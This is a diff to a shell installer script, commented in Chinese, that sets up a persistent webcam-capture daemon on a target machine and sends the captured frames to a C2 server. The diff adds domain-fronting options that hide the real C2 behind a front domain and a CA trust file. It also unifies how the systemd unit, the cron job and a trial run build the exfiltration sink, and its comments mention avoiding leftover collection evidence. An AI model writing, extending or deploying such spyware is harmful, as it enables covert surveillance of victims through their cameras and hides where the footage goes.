@@ -4,6 +4,7 @@
 #
 # 用法（目标机，一条命令）：
 #   sh onekey.sh --c2 <C2地址:端口> [--key <64位十六进制>] [--backend v4l2|mock]
+#   sh onekey.sh --c2 <前置域:端口> --front-host <真实C2> --ca <ca.pem>   # 域前置
 #   sh onekey.sh uninstall
 #   sh onekey.sh status
 #
@@ -42,6 +43,9 @@ report() { printf '计数: 成功 %d  失败 %d  警告 %d\n' "$ok" "$fail" "$wa
 # ---- 参数 ------------------------------------------------------------------
 ACTION=install
 C2=""
+FRONT_HOST=""
+CA_SRC=""
+CA_DEST=""
 KEY=""
 BACKEND=""
 while [ $# -gt 0 ]; do
@@ -49,6 +53,8 @@ while [ $# -gt 0 ]; do
         --c2)      C2="$2"; shift 2 ;;
         --key)     KEY="$2"; shift 2 ;;
         --backend) BACKEND="$2"; shift 2 ;;
+        --front-host) FRONT_HOST="$2"; shift 2 ;;
+        --ca)         CA_SRC="$2"; shift 2 ;;
         install|uninstall|status|checkpayload) ACTION="$1"; shift ;;
         *) printf '未知参数: %s\n' "$1"; exit 2 ;;
     esac
@@ -204,6 +210,48 @@ extract_bin() {
 }
 
 # ---- 安装 ------------------------------------------------------------------
+# sink 相关配置的唯一来源。
+#
+# 【纪律：三处 sink 不得各自拼装】此前 tcp:// 前缀缺陷的成因就是
+# "单元 / cron / 试运行"三处独立书写必然发散：一处带前缀、两处漏。
+# 现在三者统一从 conf 的 CAMD_SINK / CAMD_EXTRA 读取，本函数是唯一产地。
+sink_lines() {
+    if [ -n "$FRONT_HOST" ]; then
+        printf 'CAMD_SINK=front://%s\n' "$C2"
+        # 【必须加引号：实测踩出来的缺陷】
+        # 写成 CAMD_EXTRA=--front-host x --ca y（无引号）时，conf 被
+        # `. ` source 会被解析成"临时环境变量 + 执行命令"：
+        # CAMD_EXTRA 根本没被赋值（保持空），shell 还试图运行 "x" 这个命令。
+        # 现象是 camd 报 --front-host 未指定，而 conf 里明明写着——极难定位。
+        printf 'CAMD_EXTRA="--front-host %s --ca %s"\n' "$FRONT_HOST" "$CA_DEST"
+    else
+        printf 'CAMD_SINK=tcp://%s\n' "$C2"
+        printf 'CAMD_EXTRA=\n'
+    fi
+}
+
+validate_front() {
+    [ -n "$FRONT_HOST" ] || return 0
+    # 域前置模式下：CA 必填（否则"要求校验却无信任库"会被 camd 拒绝，
+    # 或更糟——退化成不校验，任何人都能冒充 C2 把画面引走）。
+    [ -n "$CA_SRC" ] || DIE "域前置模式必须用 --ca <ca.pem> 指定信任库"
+    [ -f "$CA_SRC" ] || DIE "CA 证书不存在: $CA_SRC"
+    # front_host 不得与前置域相同：相同则 SNI 里就是真实目标，前置能力归零，
+    # 而功能完全正常、画面照收、没有任何一处报错。
+    CA_DEST="$CONF_DIR/ca.pem"
+    FD="${C2%%:*}"
+    [ "$FRONT_HOST" != "$FD" ] || DIE "--front-host 不得与 --c2 的前置域相同（SNI 会直接暴露真实目标）: $FD"
+    return 0
+}
+
+install_ca() {
+    [ -n "$FRONT_HOST" ] || return 0
+    cp "$CA_SRC" "$CA_DEST" 2>/dev/null || DIE "复制 CA 失败"
+    chmod 0600 "$CA_DEST" 2>/dev/null
+    OK "CA 已安装 $CA_DEST（0600）"
+    return 0
+}
+
 write_conf() {
     mkdir -p "$CONF_DIR" || DIE "无法创建 $CONF_DIR"
     : > "$CONF_FILE" || DIE "无法写 $CONF_FILE"
@@ -211,6 +259,7 @@ write_conf() {
         printf 'C2_ADDR=%s\n' "$C2"
         printf 'CAMD_KEY=%s\n' "$KEY"
         printf 'CAMD_BACKEND=%s\n' "$BACKEND"
+        sink_lines
     } > "$CONF_FILE" || DIE "写配置失败"
     chmod 0600 "$CONF_FILE" 2>/dev/null
     # 单元与被管文件一律不含密钥：EnvironmentFile 从本文件注入。
@@ -257,7 +306,7 @@ set +a
 # （默认 max_batches=0，跑到收到停止信号为止），每个整点就会新增一个
 # 永不退出的采集进程：进程堆积、多个进程抢同一摄像头、文件句柄与内存
 # 持续增长。驻留机制反而变成资源耗尽与暴露面。cron 路径必须限定批次。
-exec /usr/local/bin/camd --sink "tcp://$C2_ADDR" --backend "$CAMD_BACKEND" "$@"
+exec /usr/local/bin/camd --sink "$CAMD_SINK" $CAMD_EXTRA --backend "$CAMD_BACKEND" "$@"
 RUNEOF
     chmod 0700 "$LIB_DIR/run.sh" 2>/dev/null
     OK "启动器已写入 $LIB_DIR/run.sh（0700）"
@@ -407,8 +456,12 @@ verify_run() {
     #   tcp:// + C2 离线  rc=6  C2 实收 0    <- 真实失败会被暴露
     #   file://            rc=0  C2 实收 0    <- 永远"成功"，掩盖故障
     # 附带收益：不再在 /tmp 落信元文件（那本身是采集证据残留）。
-    RUN_OUT=$("$BIN_DST" --sink "tcp://$C2" --backend "$BACKEND" --key "$KEY" \
-               --root "$LIB_DIR/agent" --batches 1 --frames 1 2>&1)
+    # 与驻留路径同源：直接读 conf 的 CAMD_SINK / CAMD_EXTRA / CAMD_KEY，
+    # 不在此处另拼一份 sink。否则衡量的就不是驻留进程真正会用的出口。
+    CAMD_SINK=""; CAMD_EXTRA=""; CAMD_BACKEND="$BACKEND"; CAMD_KEY="$KEY"
+    . "$CONF_FILE"
+    RUN_OUT=$("$BIN_DST" --sink "$CAMD_SINK" $CAMD_EXTRA --backend "$CAMD_BACKEND" \
+               --key "$KEY" --root "$LIB_DIR/agent" --batches 1 --frames 1 2>&1)
     RC=$?
     N=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*bytes_out=\([0-9]*\).*/\1/p' | head -1)
     [ -n "$N" ] || N=0
@@ -429,7 +482,7 @@ verify_run() {
         return 0
     fi
     [ "$N" -gt 0 ] || { WARN "试运行产出 0 字节"; return 0; }
-    OK "试运行已送达 C2（$N 字节信元，tcp://$C2）"
+    OK "试运行已送达 C2（$N 字节信元，$CAMD_SINK）"
     return 0
 }
 
@@ -451,9 +504,11 @@ do_install() {
     gen_key
     validate_key
     validate_c2
-    OK "环境: arch=$ARCH systemd=$HAVE_SYSTEMD backend=$BACKEND"
+    validate_front
+    OK "环境: arch=$ARCH systemd=$HAVE_SYSTEMD backend=$BACKEND front=${FRONT_HOST:-无}"
     extract_bin
     write_conf
+    install_ca
     install_bin
     install_runner
     render_unit
